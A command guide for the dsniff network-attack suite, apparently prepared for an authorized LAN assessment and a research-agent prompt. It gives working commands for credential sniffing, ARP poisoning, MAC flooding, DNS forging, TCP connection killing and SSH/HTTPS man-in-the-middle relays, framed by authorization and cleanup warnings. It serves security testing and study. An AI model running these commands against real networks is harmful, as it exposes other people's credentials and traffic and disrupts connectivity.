# dsniff — command scenarios for deep research

Installed build: dsniff 2.4 (Debian package `dsniff` `2.4b1+debian-34`). Every
usage line below appears in [`help.txt`](help.txt) or
[`help-tools.txt`](help-tools.txt); behaviour notes come from the individual
man pages. The suite is 14 binaries, so scenarios are grouped by function:
capture, redirect, forge, disrupt, and extract.

> **Scope:** ARP spoofing, DNS forging, switch flooding, and connection killing
> all affect other hosts' traffic. Run them only on networks and clients you
> are authorized to test. Record forwarding state and neighbour tables before
> you start, and restore them when you stop.

## How to invoke

```text
@deep-research For an authorized switched-LAN assessment, compare the dsniff
suite (2.4b1) with bettercap 2.33.0 and ettercap 0.8.3.1 for credential
capture on a modern network. Which protocols in dsniff's trigger table still
carry cleartext credentials, which have moved to TLS or token auth, and where
does each tool sit in the interception chain (redirect, capture, extract)?
Cite the dsniff man pages, the trigger and magic files, RFC 854/959/1939/2616,
and current TLS guidance; return a protocol-by-protocol viability table with
confidence notes.
```

Create an evidence workspace and record the baseline:

```bash
mkdir -p ~/dsniff-demo/evidence
date -u +'%Y-%m-%dT%H:%M:%SZ' > ~/dsniff-demo/evidence/run-start.txt
ip -brief link > ~/dsniff-demo/evidence/links.txt
ip neigh > ~/dsniff-demo/evidence/neigh-before.txt
sysctl net.ipv4.ip_forward > ~/dsniff-demo/evidence/forwarding-before.txt
```

## Scenario 1 — inventory the suite and its data files

Before capturing, know which binary does what and which files drive protocol
detection.

| # | Command | How to use |
|---|---------|------------|
| 1 | `dsniff -h` | Main usage line |
| 2 | `dpkg -L dsniff \| grep -E 'bin\|share'` | Installed binaries and data files |
| 3 | `ls -l /usr/share/dsniff/` | Trigger, magic, and hosts files |
| 4 | `head -40 /usr/share/dsniff/dsniff.services` | Protocol triggers |
| 5 | `file /usr/share/dsniff/dsniff.magic` | Magic-byte signature database |
| 6 | `man dsniff \| col -b \| sed -n '1,80p'` | Supported protocol list |
| 7 | `for t in arpspoof dnsspoof macof tcpkill tcpnice; do man "$t" 2>/dev/null \| col -b \| sed -n '1,6p'; done` | Usage summaries |
| 8 | `dpkg-query -W -f='${Version}\n' dsniff` | Installed package version |

**Research questions**
- Which of the listed protocols still send credentials in cleartext today?
- What is the difference between a trigger and a magic signature?
- Which tools need root, and which can read a pcap as an unprivileged user?
- Which binaries are in `/usr/sbin` rather than `/usr/bin`, and why?
- What does `dsniff.services` control that `dsniff.magic` does not?

**Sources:** `dsniff -h`; `man dsniff`; `dpkg -L dsniff`; RFC 854, 959, 1939.
**Output:** a suite inventory with privilege and input requirements.

## Scenario 2 — passive capture with `dsniff`

Capture is the safe half of the suite. Start with a pcap and a narrow filter
before touching a live interface.

| # | Command | How to use |
|---|---------|------------|
| 9 | `dsniff -p capture.pcap` | Offline replay |
| 10 | `dsniff -p capture.pcap -n` | Skip reverse DNS |
| 11 | `dsniff -p capture.pcap -c` | Half-duplex reassembly for asymmetric routes |
| 12 | `dsniff -p capture.pcap -m` | Automatic protocol detection |
| 13 | `sudo dsniff -i eth0` | Live capture on one interface |
| 14 | `sudo dsniff -i eth0 'tcp port 21 or tcp port 23'` | FTP and Telnet only |
| 15 | `sudo dsniff -i eth0 -t 8080/tcp=http` | Add a custom trigger |
| 16 | `sudo dsniff -i eth0 -w sessions.db` | Save sessions instead of printing |
| 17 | `dsniff -r sessions.db` | Read them back |

**Research questions**
- What does `-c` change in stream reassembly, and when is it required?
- How does `-m` differ from the default trigger table?
- What is stored in the `-w` savefile, and what is lost compared with stdout?
- Why is the default snaplen 1024 bytes, and when would you raise it?
- How does a BPF filter interact with trigger detection?

**Sources:** `dsniff -h`; `man dsniff`; `tcpdump(8)` filter syntax; pcap file
format documentation.
**Output:** a capture matrix with a verified offline/live equivalence check.

## Scenario 3 — redirect with `arpspoof` and `macof`

Redirection gets traffic to the sensor. ARP poisoning is targeted; MAC
flooding is a blunt switch-failure technique.

| # | Command | How to use |
|---|---------|------------|
| 18 | `sudo sysctl -w net.ipv4.ip_forward=1` | Enable forwarding first |
| 19 | `sudo arpspoof -i eth0 -t 192.0.2.50 192.0.2.1` | Poison one client toward the gateway |
| 20 | `sudo arpspoof -i eth0 -t 192.0.2.50 -r 192.0.2.1` | Bidirectional poisoning |
| 21 | `sudo arpspoof -i eth0 -c host -t 192.0.2.50 192.0.2.1` | Restore using the host address |
| 22 | `sudo arpspoof -i eth0 192.0.2.1` | Poison all hosts toward the gateway |
| 23 | `ip neigh show 192.0.2.50` | Watch the victim's cache change |
| 24 | `sudo macof -i eth0 -n 1000` | Bounded MAC flood test |
| 25 | `sudo macof -i eth0 -s 192.0.2.99 -d 192.0.2.1 -n 100` | Crafted flood parameters |
| 26 | `sudo sysctl -w net.ipv4.ip_forward=0` | Restore forwarding |

**Research questions**
- What breaks if forwarding is off while `arpspoof` runs?
- How does `-c host` differ from the default cleanup, and when is it riskier?
- What does `-r` add, and what does it require?
- How would dynamic ARP inspection or port security change the outcome?
- What does a MAC flood do to a switch, and what is the modern mitigation?

**Sources:** `man arpspoof`; `man macof`; RFC 826; vendor documentation for
dynamic ARP inspection, port security, and MAC-table limits.
**Output:** a poisoning record with before/after neighbour tables and a
switch-behaviour note.

## Scenario 4 — forge with `dnsspoof`

DNS forging turns interception into redirection. Hosts-file scope is the
difference between a targeted test and a subnet-wide outage.

| # | Command | How to use |
|---|---------|------------|
| 27 | `printf 'example.com 192.0.2.10\n*.example.com 192.0.2.10\n' > /tmp/spoof.hosts` | Build a hosts file |
| 28 | `sudo dnsspoof -i eth0 -f /tmp/spoof.hosts` | Forge only those names |
| 29 | `sudo dnsspoof -i eth0` | Forge every address query to the local host |
| 30 | `sudo dnsspoof -i eth0 'udp port 53'` | Narrow with a BPF filter |
| 31 | `dig @192.0.2.1 example.com` | Verify from the victim |
| 32 | `sudo dnsspoof -i eth0 -f /tmp/spoof.hosts 'src host 192.0.2.50'` | Target one client |

**Research questions**
- What does dnsspoof answer when no hosts entry matches?
- Which query types does it handle, and which does it ignore?
- How do wildcards behave, and what is explicitly unsupported?
- Why does a client's resolver choice change the attack surface?
- What defences (DNSSEC, DoH, DoT) remove this primitive?

**Sources:** `man dnsspoof`; `/usr/share/dsniff/dnsspoof.hosts`; RFC 1035;
RFC 4033–4035 (DNSSEC); RFC 8484 (DoH); RFC 7858 (DoT).
**Output:** a spoofing record with a resolver-side verification query.

## Scenario 5 — disrupt with `tcpkill` and `tcpnice`

These tools change availability rather than confidentiality. Treat them as
resilience tests, not capture steps.

| # | Command | How to use |
|---|---------|------------|
| 33 | `sudo tcpkill -i eth0 'host 192.0.2.50 and port 443'` | Kill matching connections |
| 34 | `sudo tcpkill -i eth0 -9 'host 192.0.2.50'` | Maximum brute force |
| 35 | `sudo tcpkill -i eth0 -1 'port 25'` | Gentle, one RST attempt |
| 36 | `sudo tcpnice -i eth0 -A 'host 192.0.2.50 and port 80'` | Tiny window advertisements |
| 37 | `sudo tcpnice -i eth0 -I 'host 192.0.2.50'` | ICMP source quench |
| 38 | `sudo tcpnice -i eth0 -M 'host 192.0.2.50'` | Fragmentation-needed shaping |
| 39 | `ss -tin dst 192.0.2.50` | Observe the effect on the socket |

**Research questions**
- Why must tcpkill observe the handshake to kill a connection?
- What does the `-1..9` level actually change in the packets sent?
- Why is ICMP source quench deprecated, and does it still work?
- Which of the three tcpnice modes is least likely to be logged?
- What is the difference between disrupting and intercepting for evidence?

**Sources:** `man tcpkill`; `man tcpnice`; RFC 793; RFC 1122 (source quench
deprecation); RFC 1191 (PMTU discovery).
**Output:** a disruption log with socket-state evidence and a detection note.

## Scenario 6 — extract with the snarfers and MITM relays

Extraction is where captured traffic becomes evidence. Each tool writes a
different format, and each has a scope limit.

| # | Command | How to use |
|---|---------|------------|
| 40 | `sudo urlsnarf -i eth0` | HTTP URLs in Common Log Format |
| 41 | `sudo urlsnarf -n -i eth0 'src host 192.0.2.50'` | One client, no reverse DNS |
| 42 | `mkdir -p ~/dsniff-demo/files && cd ~/dsniff-demo/files && sudo filesnarf -i eth0` | NFS files into a dedicated dir |
| 43 | `sudo mailsnarf -i eth0` | SMTP/POP into mbox |
| 44 | `sudo msgsnarf -i eth0` | Chat transcripts |
| 45 | `urlsnarf -p capture.pcap -v '\.jpg$'` | Replay, excluding image URLs |
| 46 | `sudo sshmitm -d -p 2222 192.0.2.50 22` | SSHv1 relay |
| 47 | `sudo webmitm -d 192.0.2.50` | HTTP/HTTPS relay with `webmitm.crt` |
| 48 | `sudo sshow -i eth0 'tcp port 22'` | SSH traffic analysis only |

**Research questions**
- Which snarfers honour a pcap input, and which require a live interface?
- What exactly does `filesnarf` write, and where?
- Why is `mailsnarf` output an mbox, and what does that imply for handling?
- What is the practical limit of `sshmitm` today?
- What does `sshow` infer without decrypting, and how reliable is it?

**Sources:** `man urlsnarf`; `man filesnarf`; `man mailsnarf`; `man msgsnarf`;
`man sshmitm`; `man webmitm`; `man sshow`; RFC 2616; RFC 4253.
**Output:** one artifact per extractor with a format and sensitivity note.

## Flag coverage checklist

| Tool / flag | Scenario |
|-------------|----------|
| `dsniff -h`, `dpkg -L`, data files | 1 |
| `dsniff -c`, `-d`, `-m`, `-n` | 1, 2 |
| `dsniff -i`, `-p`, `-s`, `-f`, `-t` | 2 |
| `dsniff -r`, `-w`, `expression` | 2 |
| `arpspoof -i`, `-c`, `-t`, `-r` | 3 |
| `macof -s`, `-d`, `-e`, `-x`, `-y`, `-i`, `-n` | 3 |
| `dnsspoof -i`, `-f`, `expression` | 4 |
| `tcpkill -i`, `-1..9`, `expression` | 5 |
| `tcpnice -A`, `-I`, `-M`, `-i`, `expression` | 5 |
| `urlsnarf -n`, `-i`, `-p`, `-v`, `pattern` | 6 |
| `filesnarf`, `mailsnarf`, `msgsnarf` | 6 |
| `sshmitm -d`, `-I`, `-p`, `host [port]` | 6 |
| `webmitm -d`, `host` | 6 |
| `webspy -i`, `-p`, `host` | discussion (Netscape) |
| `sshow -d`, `-i`, `-p` | 6 |

Full text: [`help.txt`](help.txt) and [`help-tools.txt`](help-tools.txt).

## Scenario index

| Scenario | Task | Commands |
|----------|------|----------|
| 1 | Suite inventory and data files | 8 |
| 2 | Passive capture with `dsniff` | 9 |
| 3 | Redirect with `arpspoof` and `macof` | 9 |
| 4 | Forge with `dnsspoof` | 6 |
| 5 | Disrupt with `tcpkill` and `tcpnice` | 7 |
| 6 | Extract with snarfers and relays | 9 |
| **Total** | | **48** |

## Legal and safety

dsniff captures credentials, forges DNS, and can break connectivity for a
whole segment. Use it only with written authorization and a named target set.
Before starting, record `net.ipv4.ip_forward` and the neighbour table; after
stopping, restore forwarding, verify caches, and check that no forged DNS
answers are still cached. Captured passwords, mail, chat logs, and files are
sensitive engagement evidence: encrypt them, keep only what the report needs,
and delete them at close.
